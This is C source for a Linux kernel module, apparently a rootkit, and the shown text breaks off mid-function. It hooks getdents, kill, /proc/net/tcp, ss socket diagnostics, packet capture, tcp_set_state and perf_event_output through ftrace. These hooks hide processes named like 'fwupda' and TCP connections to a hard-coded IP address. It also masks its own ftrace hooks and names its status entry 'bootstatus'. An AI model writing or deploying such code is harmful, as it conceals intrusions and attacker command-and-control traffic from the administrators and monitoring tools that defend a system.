/*
 * combined_module.c
 *
 * Unified LKM combining:
 *   1) Process hiding  — getdents64/getdents/kill syscall hooks (from bluetooth_devices.c)
 *   2) TCP conn hiding — tcp4_seq_show, tcp_diag, packet_rcv, tcp_set_state,
 *                         perf_event_output, tcp_v4_connect observer (from tcp_grm.c)
 *
 * Shared ftrace hook infrastructure, single kallsyms resolver, one init/exit.
 *
 * Edit the CONFIGURATION sections below, then: make && insmod combined_module.ko
 */

#include <linux/init.h>
#include <linux/namei.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/sched/mm.h>
#include <linux/sched/task.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/version.h>
#include <linux/uaccess.h>
#include <linux/dirent.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/mm.h>
#include <linux/file.h>
#include <linux/dcache.h>
#include <linux/workqueue.h>
#include <linux/netlink.h>
#include <linux/inet_diag.h>
#include <linux/inet.h>
#include <linux/delay.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/skbuff.h>
#include <linux/in.h>
#include <net/sock.h>
#include <net/tcp.h>
#include <net/inet_sock.h>
#include <net/inet_connection_sock.h>
#include <asm/unistd.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#include <linux/kprobes.h>

#endif

#ifndef SOCK_DIAG_BY_FAMILY
#define SOCK_DIAG_BY_FAMILY 20
#endif

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Experiment");
MODULE_DESCRIPTION("Combined process + TCP hiding via ftrace");

/* ================================================================
 * CONFIGURATION — PROCESS HIDING
 * ================================================================ */

/* Target process substring matched via strstr() against comm and exe path */
#define TARGET_COMM         "fwupda"

/* Max PIDs to track simultaneously */
#define MAX_HIDDEN_PIDS     64

/* Auto-rescan interval in seconds */
#define RESCAN_INTERVAL_SEC 2

/* Proc entry name (cat /proc/<this> to check status) */
#define PROC_NAME           "bootstatus"

/* ================================================================
 * CONFIGURATION — TCP HIDING
 * ================================================================ */

#define HIDDEN_PORT 0
#define HIDDEN_IP   "217.154.53.187"
#define MATCH_MODE  0

/* ================================================================
 * KERNEL VERSION COMPAT
 * ================================================================ */

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
#define USE_PT_REGS_SYSCALLS 1
#else
#define USE_PT_REGS_SYSCALLS 0
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define NEED_KPROBE_KALLSYMS 1
#else
#define NEED_KPROBE_KALLSYMS 0
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
#define USE_PROC_OPS 1
#else
#define USE_PROC_OPS 0
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6,8,0)
#define USE_NEW_FTRACE_REGS 1
#else
#define USE_NEW_FTRACE_REGS 0
#endif

/* ================================================================
 * SHARED: kallsyms resolution
 * ================================================================ */

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t ksym_lookup_fn = NULL;

static int resolve_kallsyms(void)
{
#if NEED_KPROBE_KALLSYMS
    struct kprobe kp;
    int ret;
    memset(&kp, 0, sizeof(kp));
    kp.symbol_name = "kallsyms_lookup_name";
    ret = register_kprobe(&kp);
    if (ret == 0) {
        ksym_lookup_fn = (kallsyms_lookup_name_t)kp.addr;
        unregister_kprobe(&kp);
        if (ksym_lookup_fn) return 0;
    }
    return -ENOENT;
#else
    ksym_lookup_fn = kallsyms_lookup_name;
    if (ksym_lookup_fn) return 0;
    return -ENOENT;
#endif
}

/* ================================================================
 * SHARED: Unified ftrace hook struct & machinery
 * ================================================================ */

struct ftrace_hook {
    const char   *name;
    void         *hook_func;
    void         *orig_func;
    unsigned long addr;
    struct ftrace_ops ops;
    bool          installed;
};

/* --- Ftrace callback (IPMODIFY — redirects execution) --- */

#if USE_NEW_FTRACE_REGS
static void notrace ftrace_hook_handler(unsigned long ip, unsigned long parent_ip,
                                        struct ftrace_ops *op, struct ftrace_regs *fregs)
{
    struct ftrace_hook *hook = container_of(op, struct ftrace_hook, ops);
    if (!within_module(parent_ip, THIS_MODULE))
        ftrace_regs_set_instruction_pointer(fregs, (unsigned long)hook->hook_func);
}
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(5,11,0)
static void notrace ftrace_hook_handler(unsigned long ip, unsigned long parent_ip,
                                        struct ftrace_ops *op, struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook *hook = container_of(op, struct ftrace_hook, ops);
    if (regs && !within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->hook_func;
}
#else
static void notrace ftrace_hook_handler(unsigned long ip, unsigned long parent_ip,
                                        struct ftrace_ops *op, struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(op, struct ftrace_hook, ops);
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->hook_func;
}
#endif

static int install_hook(struct ftrace_hook *hook)
{
    int ret;
    hook->installed = false;
    hook->addr = ksym_lookup_fn(hook->name);
    if (!hook->addr) return -ENOENT;
    *((unsigned long *)hook->orig_func) = hook->addr;
    hook->ops.func = ftrace_hook_handler;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
    ret = ftrace_set_filter_ip(&hook->ops, hook->addr, 0, 0);
    if (ret) return ret;
    ret = register_ftrace_function(&hook->ops);
    if (ret) { ftrace_set_filter_ip(&hook->ops, hook->addr, 1, 0); return ret; }
    hook->installed = true;
    return 0;
}

static void remove_hook(struct ftrace_hook *hook)
{
    if (!hook->installed) return;
    unregister_ftrace_function(&hook->ops);
    ftrace_set_filter_ip(&hook->ops, hook->addr, 1, 0);
    hook->installed = false;
}

/* ================================================================
 * PROCESS HIDING — PID storage
 * ================================================================ */

static int hidden_pids[MAX_HIDDEN_PIDS];
static int hidden_count = 0;
static DEFINE_SPINLOCK(hidden_pids_lock);
static int ph_hiding_active = 0;

static struct delayed_work rescan_work;
static struct workqueue_struct *rescan_wq;
static int rescan_active = 0;
static struct delayed_work hide_self_work;


typedef struct file *(*get_mm_exe_file_t)(struct mm_struct *mm);
static get_mm_exe_file_t my_get_mm_exe_file = NULL;

static int is_hidden_pid(int pid)
{
    unsigned long flags;
    int i, found = 0;

    if (pid <= 0 || !ph_hiding_active)
        return 0;

    spin_lock_irqsave(&hidden_pids_lock, flags);
    for (i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] == pid) {
            found = 1;
            break;
        }
    }
    spin_unlock_irqrestore(&hidden_pids_lock, flags);
    return found;
}

/* ================================================================
 * PROCESS HIDING — Syscall hooks
 * ================================================================ */

#if USE_PT_REGS_SYSCALLS
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);
#else
static asmlinkage long (*orig_getdents64)(unsigned int fd,
                                          struct linux_dirent64 __user *dirent,
                                          unsigned int count);
static asmlinkage long (*orig_getdents)(unsigned int fd,
                                        struct linux_dirent __user *dirent,
                                        unsigned int count);
static asmlinkage long (*orig_kill)(pid_t pid, int sig);
#endif

#if USE_PT_REGS_SYSCALLS

static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 *kdirent, *cur, *prev;
    struct linux_dirent64 __user *dirp = (void __user *)regs->si;
    long ret, offset;
    int pid, filtered;

    ret = orig_getdents64(regs);
    if (ret <= 0 || !ph_hiding_active)
        return ret;

    kdirent = kmalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return ret;

    if (copy_from_user(kdirent, dirp, ret)) {
        kfree(kdirent);
        return ret;
    }

    offset = 0; filtered = 0; prev = NULL;

    while (offset < ret) {
        cur = (void *)((char *)kdirent + offset);
        if (kstrtoint(cur->d_name, 10, &pid) == 0 && is_hidden_pid(pid)) {
            if (prev)
                prev->d_reclen += cur->d_reclen;
            filtered += cur->d_reclen;
            offset += cur->d_reclen;
            continue;
        }
        prev = cur;
        offset += cur->d_reclen;
    }

    if (filtered > 0) {
        if (copy_to_user(dirp, kdirent, ret - filtered)) {
            kfree(kdirent);
            return ret;
        }
        kfree(kdirent);
        return ret - filtered;
    }

    kfree(kdirent);
    return ret;
}

static asmlinkage long hook_kill(const struct pt_regs *regs)
{
    pid_t pid = (pid_t)regs->di;
    if (is_hidden_pid(pid) && ph_hiding_active)
        return -ESRCH;
    return orig_kill(regs);
}

#else /* Pre-4.17 */

static asmlinkage long hook_getdents64(unsigned int fd,
                                       struct linux_dirent64 __user *dirp,
                                       unsigned int count)
{
    struct linux_dirent64 *kdirent, *cur, *prev;
    long ret, offset;
    int pid, filtered;

    ret = orig_getdents64(fd, dirp, count);
    if (ret <= 0 || !ph_hiding_active)
        return ret;

    kdirent = kmalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return ret;

    if (copy_from_user(kdirent, dirp, ret)) {
        kfree(kdirent);
        return ret;
    }

    offset = 0; filtered = 0; prev = NULL;

    while (offset < ret) {
        cur = (void *)((char *)kdirent + offset);
        if (kstrtoint(cur->d_name, 10, &pid) == 0 && is_hidden_pid(pid)) {
            if (prev)
                prev->d_reclen += cur->d_reclen;
            filtered += cur->d_reclen;
            offset += cur->d_reclen;
            continue;
        }
        prev = cur;
        offset += cur->d_reclen;
    }

    if (filtered > 0) {
        if (copy_to_user(dirp, kdirent, ret - filtered)) {
            kfree(kdirent);
            return ret;
        }
        kfree(kdirent);
        return ret - filtered;
    }

    kfree(kdirent);
    return ret;
}

static asmlinkage long hook_kill(pid_t pid, int sig)
{
    if (is_hidden_pid(pid) && ph_hiding_active)
        return -ESRCH;
    return orig_kill(pid, sig);
}

#endif

/* ================================================================
 * PROCESS HIDING — Matching logic
 * ================================================================ */

static int match_task(struct task_struct *task, char *pathbuf)
{
    struct mm_struct *mm;
    struct file *exe;
    char *path;

    if (strstr(task->comm, TARGET_COMM))
        return 1;

    if (!my_get_mm_exe_file || !pathbuf)
        return 0;

    mm = get_task_mm(task);
    if (!mm)
        return 0;

    exe = my_get_mm_exe_file(mm);
    mmput(mm);
    if (!exe)
        return 0;

    path = d_path(&exe->f_path, pathbuf, PATH_MAX);
    fput(exe);

    if (IS_ERR(path))
        return 0;

    return strstr(path, TARGET_COMM) != NULL;
}

/* ================================================================
 * PROCESS HIDING — PID management
 * ================================================================ */

static void add_hidden_pid(pid_t pid)
{
    unsigned long flags;
    int i;

    spin_lock_irqsave(&hidden_pids_lock, flags);
    for (i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] == pid) {
            spin_unlock_irqrestore(&hidden_pids_lock, flags);
            return;
        }
    }
    if (hidden_count < MAX_HIDDEN_PIDS)
        hidden_pids[hidden_count++] = pid;
    spin_unlock_irqrestore(&hidden_pids_lock, flags);
}

static void cleanup_dead_pids(void)
{
    unsigned long flags;
    struct pid *ps;
    int i, j;

    spin_lock_irqsave(&hidden_pids_lock, flags);
    for (i = 0; i < hidden_count; ) {
        ps = find_get_pid(hidden_pids[i]);
        if (!ps || !pid_task(ps, PIDTYPE_PID)) {
            for (j = i; j < hidden_count - 1; j++)
                hidden_pids[j] = hidden_pids[j + 1];
            hidden_count--;
            if (ps) put_pid(ps);
            continue;
        }
        put_pid(ps);
        i++;
    }
    spin_unlock_irqrestore(&hidden_pids_lock, flags);
}

static void capture_target_pids(void)
{
    struct task_struct *task;
    char *buf;

    buf = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!buf)
        return;

    rcu_read_lock();
    for_each_process(task) {
        if (hidden_count >= MAX_HIDDEN_PIDS)
            break;
        if (match_task(task, buf))
            add_hidden_pid(task->pid);
    }
    rcu_read_unlock();

    kfree(buf);
}

/* ================================================================
 * PROCESS HIDING — Auto-capture workqueue
 * ================================================================ */

static void rescan_work_fn(struct work_struct *work)
{
    if (!rescan_active)
        return;

    cleanup_dead_pids();
    capture_target_pids();

    if (RESCAN_INTERVAL_SEC > 0)
        queue_delayed_work(rescan_wq, &rescan_work,
                           msecs_to_jiffies(RESCAN_INTERVAL_SEC * 1000));
}

/* ================================================================
 * PROCESS HIDING — /proc status interface
 * ================================================================ */

static int proc_show(struct seq_file *m, void *v)
{
    unsigned long flags;
    int i;

    spin_lock_irqsave(&hidden_pids_lock, flags);
    seq_printf(m, "Hidden PIDs (%d): ", hidden_count);
    for (i = 0; i < hidden_count; i++)
        seq_printf(m, "%d ", hidden_pids[i]);
    seq_puts(m, "\n");
    seq_printf(m, "Hiding active: %s\n", ph_hiding_active ? "YES" : "NO");
    seq_printf(m, "Target: %s\n", TARGET_COMM);
    seq_printf(m, "Auto-capture: rescan every %ds\n", RESCAN_INTERVAL_SEC);
    spin_unlock_irqrestore(&hidden_pids_lock, flags);
    return 0;
}

static int proc_open(struct inode *inode, struct file *file)
{
    return single_open(file, proc_show, NULL);
}

#if USE_PROC_OPS
static const struct proc_ops proc_fops = {
    .proc_open    = proc_open,
    .proc_read    = seq_read,
    .proc_lseek   = seq_lseek,
    .proc_release = single_release,
};
#else
static const struct file_operations proc_fops = {
    .owner   = THIS_MODULE,
    .open    = proc_open,
    .read    = seq_read,
    .llseek  = seq_lseek,
    .release = single_release,
};
#endif

/* ================================================================
 * PROCESS HIDING — Hook table
 * ================================================================ */

static struct ftrace_hook ph_hooks[] = {
    {
#if USE_PT_REGS_SYSCALLS
        .name      = "__x64_sys_getdents64",
#else
        .name      = "sys_getdents64",
#endif
        .hook_func = hook_getdents64,
        .orig_func = &orig_getdents64,
    },
    {
#if USE_PT_REGS_SYSCALLS
        .name      = "__x64_sys_getdents",
#else
        .name      = "sys_getdents",
#endif
        .hook_func = hook_getdents64,
        .orig_func = &orig_getdents,
    },
    {
#if USE_PT_REGS_SYSCALLS
        .name      = "__x64_sys_kill",
#else
        .name      = "sys_kill",
#endif
        .hook_func = hook_kill,
        .orig_func = &orig_kill,
    },
};

#define PH_NUM_HOOKS ARRAY_SIZE(ph_hooks)

static int ph_install_hooks(void)
{
    int i, err;

    for (i = 0; i < PH_NUM_HOOKS; i++) {
        ph_hooks[i].installed = false;
        err = install_hook(&ph_hooks[i]);
        if (err) {
            /* sys_getdents (32-bit compat) may not exist — skip gracefully */
            if (i == 1 && err == -ENOENT) {
                continue;
            }
            while (--i >= 0)
                remove_hook(&ph_hooks[i]);
            return err;
        }
    }

    ph_hiding_active = 1;
    return 0;
}

static void ph_remove_hooks(void)
{
    int i;
    ph_hiding_active = 0;
    for (i = PH_NUM_HOOKS - 1; i >= 0; i--)
        remove_hook(&ph_hooks[i]);
}

/* ================================================================
 * TCP HIDING — IP/port match logic
 * ================================================================ */

static __be32 hidden_ip_be32 = 0;
static void (*fn_inet_put_port)(struct sock *sk) = NULL;

static void parse_ip(void)
{
    unsigned int a, b, c, d;
    const char *ip = HIDDEN_IP;
    if (!ip || !ip[0]) { hidden_ip_be32 = 0; return; }
    if (sscanf(ip, "%u.%u.%u.%u", &a, &b, &c, &d) == 4 &&
        a <= 255 && b <= 255 && c <= 255 && d <= 255)
        hidden_ip_be32 = htonl((a << 24) | (b << 16) | (c << 8) | d);
}

static inline bool should_hide(unsigned short local_port, __be32 remote_ip)
{
    bool port_match = (HIDDEN_PORT != 0 && local_port == HIDDEN_PORT);
    bool ip_match   = (hidden_ip_be32 != 0 && remote_ip == hidden_ip_be32);
    if (HIDDEN_PORT == 0 && hidden_ip_be32 == 0) return false;
    if (HIDDEN_PORT == 0) return ip_match;
    if (hidden_ip_be32 == 0) return port_match;
    if (MATCH_MODE == 1) return port_match && ip_match;
    return port_match || ip_match;
}

static inline bool sock_is_hidden(struct sock *sk)
{
    if (!sk) return false;
    return should_hide(sk->sk_num, sk->sk_daddr);
}

static inline bool skb_should_hide(struct sk_buff *skb)
{
    struct iphdr *iph;
    struct tcphdr *tcph;
    unsigned int iph_len;

    if (!skb || skb->protocol != htons(ETH_P_IP))
        return false;
    if (!pskb_may_pull(skb, skb_network_offset(skb) + sizeof(struct iphdr)))
        return false;
    iph = ip_hdr(skb);
    if (!iph || iph->protocol != IPPROTO_TCP)
        return false;
    iph_len = iph->ihl * 4;
    if (iph_len < sizeof(struct iphdr))
        return false;
    if (!pskb_may_pull(skb, skb_network_offset(skb) + iph_len + sizeof(struct tcphdr)))
        return false;
    iph = ip_hdr(skb);
    tcph = (struct tcphdr *)((unsigned char *)iph + iph_len);
    if (should_hide(ntohs(tcph->source), iph->daddr)) return true;
    if (should_hide(ntohs(tcph->dest), iph->saddr))   return true;
    return false;
}

/* ================================================================
 * TCP HIDING — Hidden TID tracking (for perf_event_output suppression)
 * ================================================================ */

#define MAX_HIDDEN_TIDS 128

struct hidden_entry {
    int tid;
    unsigned long expire;
};

static struct hidden_entry htids[MAX_HIDDEN_TIDS];

static void htid_add(int tid)
{
    int i;
    unsigned long exp = jiffies + 2 * HZ;

    for (i = 0; i < MAX_HIDDEN_TIDS; i++) {
        if (READ_ONCE(htids[i].tid) == tid) {
            WRITE_ONCE(htids[i].expire, exp);
            return;
        }
    }
    for (i = 0; i < MAX_HIDDEN_TIDS; i++) {
        if (READ_ONCE(htids[i].tid) == 0 ||
            time_after(jiffies, READ_ONCE(htids[i].expire))) {
            WRITE_ONCE(htids[i].tid, tid);
            WRITE_ONCE(htids[i].expire, exp);
            return;
        }
    }
    WRITE_ONCE(htids[0].tid, tid);
    WRITE_ONCE(htids[0].expire, exp);
}

static bool htid_check(int tid)
{
    int i;
    for (i = 0; i < MAX_HIDDEN_TIDS; i++) {
        if (READ_ONCE(htids[i].tid) == tid &&
            time_before(jiffies, READ_ONCE(htids[i].expire)))
            return true;
    }
    return false;
}

/* ================================================================
 * TCP HIDING — tcp_v4_connect observer (NON-IPMODIFY)
 * ================================================================ */

static struct ftrace_ops observer_ops;
static unsigned long observer_addr = 0;
static bool observer_installed = false;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,11,0)
static void notrace observer_callback(unsigned long ip, unsigned long parent_ip,
    struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct sockaddr_in sin;

    if (!regs) return;
    if (within_module(parent_ip, THIS_MODULE)) return;

    if (copy_from_kernel_nofault(&sin, (void *)regs->si, sizeof(sin)) == 0) {
        if (sin.sin_family == AF_INET &&
            should_hide(ntohs(sin.sin_port), sin.sin_addr.s_addr)) {
            htid_add(current->pid);
        }
    }
}
#else
static void notrace observer_callback(unsigned long ip, unsigned long parent_ip,
    struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct sockaddr_in sin;

    if (!regs) return;
    if (within_module(parent_ip, THIS_MODULE)) return;

    if (copy_from_kernel_nofault(&sin, (void *)regs->si, sizeof(sin)) == 0) {
        if (sin.sin_family == AF_INET &&
            should_hide(ntohs(sin.sin_port), sin.sin_addr.s_addr)) {
            htid_add(current->pid);
        }
    }
}
#endif

static int install_observer(void)
{
    int ret;

    observer_addr = ksym_lookup_fn("tcp_v4_connect");
    if (!observer_addr) return -ENOENT;

    observer_ops.func = observer_callback;
    observer_ops.flags = FTRACE_OPS_FL_SAVE_REGS; /* NO IPMODIFY */

    ret = ftrace_set_filter_ip(&observer_ops, observer_addr, 0, 0);
    if (ret) return ret;

    ret = register_ftrace_function(&observer_ops);
    if (ret) {
        ftrace_set_filter_ip(&observer_ops, observer_addr, 1, 0);
        return ret;
    }

    observer_installed = true;
    return 0;
}

static void remove_observer(void)
{
    if (!observer_installed) return;
    unregister_ftrace_function(&observer_ops);
    ftrace_set_filter_ip(&observer_ops, observer_addr, 1, 0);
    observer_installed = false;
}

/* ================================================================
 * TCP HIDING — Hook 0: tcp4_seq_show (/proc/net/tcp)
 * ================================================================ */

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    if (sk == (struct sock *)0x1) return orig_tcp4_seq_show(seq, v);
    if (should_hide(sk->sk_num, sk->sk_daddr)) return 0;
    return orig_tcp4_seq_show(seq, v);
}

/* ================================================================
 * TCP HIDING — Hook 1: tcp_diag_dump (ss netlink)
 * ================================================================ */

static int (*orig_tcp_diag_dump)(struct sk_buff *skb, struct netlink_callback *cb);

static void filter_diag_nlmsg(struct sk_buff *skb)
{
    struct nlmsghdr *nlh; struct inet_diag_msg *r;
    unsigned int removed = 0, total_len = skb->len, offset = 0;
    unsigned int msg_len, remaining; unsigned short sport; __be32 rip;
    unsigned char *start = skb->data;

    while (offset < total_len) {
        nlh = (struct nlmsghdr *)(start + offset);
        if (!NLMSG_OK(nlh, total_len - offset)) break;
        msg_len = NLMSG_ALIGN(nlh->nlmsg_len);
        if (msg_len < NLMSG_HDRLEN || msg_len > total_len - offset) break;
        if (nlh->nlmsg_type == SOCK_DIAG_BY_FAMILY || nlh->nlmsg_type >= NLMSG_MIN_TYPE) {
            if (nlh->nlmsg_len < NLMSG_LENGTH(sizeof(struct inet_diag_msg)))
                { offset += msg_len; continue; }
            r = nlmsg_data(nlh);
            sport = ntohs(r->id.idiag_sport); rip = r->id.idiag_dst[0];
            if (should_hide(sport, rip)) {
                remaining = total_len - offset - msg_len;
                if (remaining > 0) memmove(start+offset, start+offset+msg_len, remaining);
                total_len -= msg_len; removed += msg_len; continue;
            }
        }
        offset += msg_len;
    }
    if (removed) { skb->len -= removed; skb->tail -= removed; }
}

static int hook_tcp_diag_dump(struct sk_buff *skb, struct netlink_callback *cb)
{
    unsigned int pre = skb->len;
    int ret = orig_tcp_diag_dump(skb, cb);
    if (skb->len > pre) filter_diag_nlmsg(skb);
    return ret;
}

/* ================================================================
 * TCP HIDING — Hook 2: tcp_diag_dump_one
 * ================================================================ */

static int (*orig_tcp_diag_dump_one)(struct netlink_callback *cb,
    const struct inet_diag_req_v2 *req);
static int hook_tcp_diag_dump_one(struct netlink_callback *cb,
    const struct inet_diag_req_v2 *req)
{
    if (should_hide(ntohs(req->id.idiag_sport), req->id.idiag_dst[0]))
        return -ENOENT;
    return orig_tcp_diag_dump_one(cb, req);
}

/* ================================================================
 * TCP HIDING — Hook 3: tpacket_rcv (AF_PACKET MMAP)
 * ================================================================ */

static int (*orig_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev,
    struct packet_type *pt, struct net_device *orig_dev);
static int hook_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
    struct packet_type *pt, struct net_device *orig_dev)
{
    if (skb_should_hide(skb)) { consume_skb(skb); return 0; }
    return orig_tpacket_rcv(skb, dev, pt, orig_dev);
}

/* ================================================================
 * TCP HIDING — Hook 4: packet_rcv (AF_PACKET legacy)
 * ================================================================ */

static int (*orig_packet_rcv)(struct sk_buff *skb, struct net_device *dev,
    struct packet_type *pt, struct net_device *orig_dev);
static int hook_packet_rcv(struct sk_buff *skb, struct net_device *dev,
    struct packet_type *pt, struct net_device *orig_dev)
{
    if (skb_should_hide(skb)) { consume_skb(skb); return 0; }
    return orig_packet_rcv(skb, dev, pt, orig_dev);
}

/* ================================================================
 * TCP HIDING — Hook 5: tcp_set_state (tracepoint suppression)
 * ================================================================ */

static void (*orig_tcp_set_state)(struct sock *sk, int state);

static void hook_tcp_set_state(struct sock *sk, int state)
{
    if (sock_is_hidden(sk)) {
        int oldstate = sk->sk_state;

        if (state == TCP_CLOSE) {
            if (oldstate == TCP_CLOSE_WAIT || oldstate == TCP_ESTABLISHED)
                TCP_INC_STATS(sock_net(sk), TCP_MIB_ESTABRESETS);
            sk->sk_prot->unhash(sk);
            if (fn_inet_put_port &&
                inet_csk(sk)->icsk_bind_hash &&
                !(sk->sk_userlocks & SOCK_BINDPORT_LOCK))
                fn_inet_put_port(sk);
        }

        if (state == TCP_ESTABLISHED && oldstate != TCP_ESTABLISHED)
            TCP_INC_STATS(sock_net(sk), TCP_MIB_CURRESTAB);
        if (state != TCP_ESTABLISHED && oldstate == TCP_ESTABLISHED)
            TCP_DEC_STATS(sock_net(sk), TCP_MIB_CURRESTAB);

        smp_store_release(&sk->sk_state, state);
        return;
    }

    orig_tcp_set_state(sk, state);
}

/* ================================================================
 * TCP HIDING — Hook 6: perf_event_output (BPF event suppression)
 * ================================================================ */

static int (*orig_perf_event_output)(void *event, void *data, void *regs);

static int hook_perf_event_output(void *event, void *data, void *regs)
{
    if (htid_check(current->pid))
        return 0;
    return orig_perf_event_output(event, data, regs);
}

/* ================================================================
 * TCP HIDING — Hook table
 * ================================================================ */

#define TH(_n,_h,_o) { .name=(_n),.hook_func=(_h),.orig_func=(_o),.installed=false }
static struct ftrace_hook th_hooks[] = {
    TH("tcp4_seq_show",      hook_tcp4_seq_show,      &orig_tcp4_seq_show),      /* 0 */
    TH("tcp_diag_dump",      hook_tcp_diag_dump,      &orig_tcp_diag_dump),      /* 1 */
    TH("tcp_diag_dump_one",  hook_tcp_diag_dump_one,  &orig_tcp_diag_dump_one),  /* 2 */
    TH("tpacket_rcv",        hook_tpacket_rcv,        &orig_tpacket_rcv),        /* 3 */
    TH("packet_rcv",         hook_packet_rcv,         &orig_packet_rcv),         /* 4 */
    TH("tcp_set_state",      hook_tcp_set_state,      &orig_tcp_set_state),      /* 5 */
    TH("perf_event_output",  hook_perf_event_output,  &orig_perf_event_output),  /* 6 */
};
#define TH_NUM_HOOKS ARRAY_SIZE(th_hooks)

static const char *alt_dump[] = {"tcp_diag_dump","tcp_diag_dump_icsk","inet_diag_dump_icsk",NULL};
static const char *alt_one[]  = {"tcp_diag_dump_one","tcp_diag_get_exact","inet_diag_dump_one_icsk",NULL};
static const char *alt_perf[] = {"perf_event_output","bpf_event_output",
                                 "__bpf_perf_event_output","perf_event_output_forward",NULL};

static int try_install_alt(struct ftrace_hook *hook, const char **alts)
{
    int i, ret; unsigned long addr;
    for (i = 0; alts[i]; i++) {
        addr = ksym_lookup_fn(alts[i]);
        if (addr) {
            hook->addr = addr;
            *((unsigned long *)hook->orig_func) = addr;
            hook->ops.func = ftrace_hook_handler;
            hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
            ret = ftrace_set_filter_ip(&hook->ops, addr, 0, 0);
            if (ret) continue;
            ret = register_ftrace_function(&hook->ops);
            if (ret) { ftrace_set_filter_ip(&hook->ops, addr, 1, 0); continue; }
            hook->installed = true;
            return 0;
        }
    }
    return -ENOENT;
}

struct ftrace_hash_rk {
    unsigned long       size_bits;
    struct hlist_head   *buckets;
    unsigned long       count;
    unsigned long       flags;
    struct rcu_head     rcu;
};

struct ftrace_page_rk {
    struct ftrace_page_rk *next;
    struct dyn_ftrace     *records;
    int                    index;
    int                    size;
};

#define do_for_each_ftrace_rec(pg, rec)                         \
    for (pg = *p_ftrace_pages_start; pg; pg = pg->next) {       \
        int _____i;                                             \
        for (_____i = 0; _____i < pg->index; _____i++) {        \
            rec = &pg->records[_____i];

#define while_for_each_ftrace_rec()     \
        }                               \
    }

static struct mutex *p_ftrace_lock = NULL;
static struct ftrace_page_rk **p_ftrace_pages_start = NULL;
static struct ftrace_func_entry *(*p_ftrace_lookup_ip)(
    struct ftrace_hash_rk *hash, unsigned long ip) = NULL;

#ifndef FTRACE_FL_ENABLED
#define FTRACE_FL_ENABLED   (1UL << 31)
#endif
static void ef_hide_ftrace_ops(struct ftrace_ops *fops)
{
    struct ftrace_hash_rk *hash;
    struct ftrace_page_rk *pg = NULL;
    struct dyn_ftrace *rec = NULL;

    if (!fops || !p_ftrace_lock || !p_ftrace_pages_start || !p_ftrace_lookup_ip)
        return;

    mutex_lock(p_ftrace_lock);

    hash = (struct ftrace_hash_rk *)fops->func_hash->filter_hash;
    do_for_each_ftrace_rec(pg, rec) {
        if (p_ftrace_lookup_ip(hash, rec->ip)) {
            rec->flags &= ~FTRACE_FL_ENABLED;
            
        }
    } while_for_each_ftrace_rec();

    mutex_unlock(p_ftrace_lock);
}

static void ef_hide_ftrace_ops_addr(struct ftrace_ops *fops, unsigned long addr)
{
    struct ftrace_hash_rk *hash;
    struct ftrace_page_rk *pg = NULL;
    struct dyn_ftrace *rec = NULL;

    if (!fops || !addr || !p_ftrace_lock || !p_ftrace_pages_start || !p_ftrace_lookup_ip)
        return;

    mutex_lock(p_ftrace_lock);

    hash = (struct ftrace_hash_rk *)fops->func_hash->filter_hash;
    do_for_each_ftrace_rec(pg, rec) {
        if (rec->ip == addr && p_ftrace_lookup_ip(hash, rec->ip)) {
            rec->flags &= ~FTRACE_FL_ENABLED;
            
        }
    } while_for_each_ftrace_rec();

    mutex_unlock(p_ftrace_lock);
}

static bool ef_installed = false;

static int ef_install(void)
{
    int i;

    p_ftrace_lock = (struct mutex *)ksym_lookup_fn("ftrace_lock");
    if (!p_ftrace_lock) return -ENOENT;

    p_ftrace_pages_start = (struct ftrace_page_rk **)
        ksym_lookup_fn("ftrace_pages_start");
    if (!p_ftrace_pages_start) return -ENOENT;

    p_ftrace_lookup_ip = (struct ftrace_func_entry *(*)(
        struct ftrace_hash_rk *, unsigned long))
        ksym_lookup_fn("ftrace_lookup_ip");
    if (!p_ftrace_lookup_ip) return -ENOENT;

    /* Hide process-hiding ftrace hooks */
    for (i = 0; i < PH_NUM_HOOKS; i++) {
        if (ph_hooks[i].installed)
            ef_hide_ftrace_ops(&ph_hooks[i].ops);
    }

    /* Hide TCP-hiding ftrace hooks */
    for (i = 0; i < TH_NUM_HOOKS; i++) {
        if (th_hooks[i].installed)
            ef_hide_ftrace_ops(&th_hooks[i].ops);
    }

    /* Hide tcp_v4_connect observer */
    if (observer_installed)
        ef_hide_ftrace_ops(&observer_ops);

